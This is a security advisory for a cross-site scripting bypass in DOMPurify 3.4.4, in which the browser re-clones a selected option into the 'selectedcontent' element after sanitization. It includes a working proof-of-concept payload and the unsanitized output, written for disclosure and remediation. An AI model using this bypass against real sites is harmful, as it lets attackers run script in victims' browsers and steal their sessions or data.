# [H] DOMPurify XSS via selectedcontent re-clone

## Summary
Severity: High
Advisory: GHSA-87xg-pxx2-7hvx
CVE: CVE-2026-47423
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-01
Source: https://github.com/advisories/GHSA-87xg-pxx2-7hvx
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=3.4.4 <3.4.5

## Details
### Summary
DOMPurify 3.4.4 allows `selectedcontent` by default, allowing a chain in which browsers "re-clone" an XSS payload after sanitization, effectively bypassing DOMPurify. 

### Details
The chain is as follows:
1. The browser parses the input and creates a `<selectedcontent>` clone from the selected `<option>`
2. DOMPurify walks and sanitizes that generated clone.
3. DOMPurify reaches the original `<option>` and removes `selected=javascript:1`
4. The browser refreshes the `<selectedcontent>` clone from the original `option`'s content.
5. The refreshed clone is in a subtree DOMPurify already walked, which DOMPurify doesn't go back to sanitize
6. The returned string contains unsanitized markup inside `<selectedcontent>`.

### PoC
```js
const dirty =
  '<select><button><selectedcontent></selectedcontent></button>' +
  '<option selected=javascript:1>' +
  '<img src=x onerror=alert(1)>x' +
  '</option></select>';

const clean = DOMPurify.sanitize(dirty);
console.log(clean);

document.body.innerHTML = clean;
```

Observed "sanitized" output in Chromium 148/WebKit 625:
```html
<select><button><selectedcontent><img src="x" onerror="alert(1)">x</selectedcontent></button><option><img src="x">x</option></select>
```

After reinsertion, the browser updates the live DOM and strips the handler from the displayed clone, but the `onerror` has already fired:
```html
<select><button><selectedcontent><img src="x">x</selectedcontent></button><option><img src="x">x</option></select>
```

Reproduced in Chromium and WebKit, but not Safari (not yet latest WebKit) or Firefox. Will likely change with [browser support](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/selectedcontent) for `selectedcontent`.

### Impact
This is a default-configuration DOMPurify sanitizer bypass resulting in XSS.

Applications are impacted if they sanitize attacker-controlled HTML with DOMPurify 3.4.4 using the string-input path and then insert the returned string into the page, for example with innerHTML.

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-87xg-pxx2-7hvx
- https://github.com/cure53/DOMPurify
